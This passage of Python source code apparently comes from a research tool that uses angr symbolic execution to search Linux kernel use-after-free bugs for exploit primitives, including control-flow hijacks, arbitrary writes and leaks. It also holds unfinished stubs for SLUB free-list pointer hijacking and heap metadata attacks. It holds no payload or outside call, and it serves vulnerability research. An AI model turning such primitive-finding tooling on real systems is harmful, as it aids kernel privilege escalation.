            if self.pause_on_each_step:
                print('step?<-')
                #import IPython; IPython.embed()
                
    
    #house on heap
    def get_single_value_from_expr(self, expr):
        return self.sol.eval(expr, 1)[0]

    def is_meta_data_overwritten(self, write_primitive):
        expr = write_primitive['in_object_offset_to_write'] == 0
        val = self.get_single_value_from_expr(expr)
        if val == 1:
            return True
        else:
            return False

    def is_writing_self_reference(self, write_primitive):
        expr_to_write = write_primitive['expr_to_write']
        address_to_write = write_primitive['address_to_write']
        print('writing', expr_to_write, 'to', address_to_write)
        if self.get_single_value_from_expr(expr_to_write) ^ self.get_single_value_from_expr(address_to_write)\
                <= 0x1000:
            print('found self reference write primitive')
            return True
        return False

    def try_heap_metadata_exploit(self, write_primitive):
        if self.target_allocator == 'slub':
            if self.is_meta_data_overwritten(write_primitive):
                self.perform_free_ptr_hijack_slub(write_primitive)
            elif self.is_writing_self_reference(write_primitive):
                self.perform_shendi_attack(write_primitive)
            else:
                print('[-] this primitive does not write to heap metadata')
        else:
            return False
        return False

    def perform_free_ptr_hijack_slub(self, write_primitive):
        s = write_primitive['state']
        # dump history actions
        for action in s.actions:
            print(action)
        expr_to_write = write_primitive['expr_to_write']
        address_to_write = write_primitive['address_to_write']
        print('writing', expr_to_write, 'to', address_to_write)
        if self.get_single_value_from_expr(expr_to_write) ^ self.get_single_value_from_expr(address_to_write)\
                <= 0x100000:
            print('[+] loop in free-list ptr')
            if self.vulnerability_type == 'uaf':
                object_pairs = self.select_auxiliary_object_pair_for_free_ptr_loop(self.uaf_object_size)
                print('use object pairs:', object_pairs)
                #import IPython; IPython.embed()

            else:
                pass
        return

    def perform_shendi_attack(self, write_primitive):
        # TODO implement this attack with reference to shendi's slides
        print(write_primitive)
        print('shendi\'s attack')
        #import IPython; IPython.embed()
        return
    
    #instrusmentation
    def enable_custom_concretize(self, state):
        """
        obsolete
        :param state:
        :return:
        """
        print('[+] switching current concretization_strategy to Kuafffp...')
        state.inspect.address_concretization_strategy = self.kuafffp_concretizer
        #input()
        return

    def add_concretization_strategy(self, state, name_concretization_strategy):
        if name_concretization_strategy == 'kuafffp':
            print('using kuafffp concretization')
            state.memory.read_strategies.insert(
                0, concretization_strategies.SimConcretizationStrategyKuafffp(mapped_addr=
                                                                              self.userspace_base,
                                                                              length=4096,
                                                                              limit=1))
        elif name_concretization_strategy == 'kuafffp2':  # more conservative concretization strategy
            print('using kuafffp2 concretization2')
            state.memory.read_strategies.insert(
                0, concretization_strategies.SimConcretizationStrategyKuafffp2(mapped_addr=
                                                                               self.userspace_base,
                                                                               length=4096*self.num_user_pages,
                                                                               limit=1,
                                                                               step=0x100
                                                                               )
            )
        elif name_concretization_strategy == 'kuafffp3':  # more conservative concretization strategy
            print('using kuafffp3 concretization3')
            state.memory.read_strategies.insert(0, angr.concretization_strategies.mycontrolled_data.MySimConcretizationStrategyControlledData(\
                    1, [self.uaf_object_base]))
        return

    def add_instrumentation(self, s):
        if len(self.extra_bp) > 0:  # TODO such bp is really bad
            for bp in self.extra_bp:
                s.inspect.b('instruction', when=angr.BP_BEFORE
                            , instruction=bp
                            , action=self.track_bp)
        s.inspect.b('mem_read', when=angr.BP_BEFORE, action=self.track_reads)
        s.inspect.b('mem_write', when=angr.BP_BEFORE, action=self.track_writes)
        s.inspect.b('call', when=angr.BP_BEFORE, action=self.track_call)
        s.inspect.b('symbolic_variable', when=angr.BP_AFTER, action=self.track_symbolic_variable)
        #s.inspect.b('address_concretization', when=angr.BP_BEFORE, action=self.address_concretization_before)
        #s.inspect.b('address_concretization', when=angr.BP_AFTER, action=self.address_concretization_after)
    
    #start explore
    def dump_state_path_history(self, state):
        print('[+] Dumping history basic blocks:')
        for addr in state.history.bbl_addrs:
            print(hex(addr))
        print('[+] End dumping history basic blocks')

    def dump_all_primitives(self):
        print('[+] Dumping all primitives found')

        bbls = []
        # self.assigned_start_time = assigned_start_time
        # self.start_time_of_symbolic_execution = 0
        # colorama.Fore.RED + '[+] found an write_to_uaf_object primitive' + colorama.Style.RESET_ALL
        print(colorama.Fore.RED \
            , 'total number of primitives:', str(len(self.control_flow_hijack_primitive) \
                                                 + len(self.write_to_uaf_object_primitive) \
                                                 + len(self.write_to_symbolic_address_primitive) \
                                                 + len(self.memory_leak_primitive)) \
            , colorama.Style.RESET_ALL)

        print(colorama.Fore.RED \
            , '[+] number of control_flow_hijack_primitives:', len(self.control_flow_hijack_primitive) \
            , colorama.Style.RESET_ALL)
        for i, primitive in enumerate(self.control_flow_hijack_primitive):
            print('\ttime to find the', i, 'th primitive ', \
                str(primitive['timestamp'] - self.assigned_start_time))
            print('\t\tprimitive', primitive)
            print('\t\taddress:', hex(primitive['address']))
            print('\t\tblock_count:', primitive['state'].history.block_count)
            bbls.append(primitive['state'].history.block_count)

        print(colorama.Fore.RED \
            , '[+] number of write_to_symbolic_address_primitive:', len(self.write_to_symbolic_address_primitive) \
            , colorama.Style.RESET_ALL)
        for i, primitive in enumerate(self.write_to_symbolic_address_primitive):
            print('\ttime to find the', i, 'th primitive ', \
                str(primitive['timestamp'] - self.assigned_start_time))
            print('\t\tprimitive', primitive)
            print('\t\tblock_count', primitive['state'].history.block_count)
            bbls.append(primitive['state'].history.block_count)

        print(colorama.Fore.RED \
            , '[+] number of write_to_uaf_object_primitive:', len(self.write_to_uaf_object_primitive) \
            , colorama.Style.RESET_ALL)
        for i, primitive in enumerate(self.write_to_uaf_object_primitive):
            print('\ttime to find the', i, 'th primitive ', \
                str(primitive['timestamp'] - self.assigned_start_time))
            print('\t\tprimitive', primitive)
            print('\t\tblock_count', primitive['state'].history.block_count)
            bbls.append(primitive['state'].history.block_count)

        print(colorama.Fore.RED \
            , '[+] number of memory_leak_primitive:', len(self.memory_leak_primitive) \
            , colorama.Style.RESET_ALL)
        for i, primitive in enumerate(self.memory_leak_primitive):
            print('\ttime to find the', i, 'th primitive ', \
                str(primitive['timestamp'] - self.assigned_start_time))
            print('\t\tprimitive', primitive)
            print('\t\tblock_count', primitive['state'].history.block_count)
            bbls.append(primitive['state'].history.block_count)
        if len(bbls) != 0:
            print('[+] max length', max(bbls))
            print('[+] min length', min(bbls))
            print('[+] average', sum(bbls) / len(bbls))
        # self.double_free_primitive=[] #double free primitive

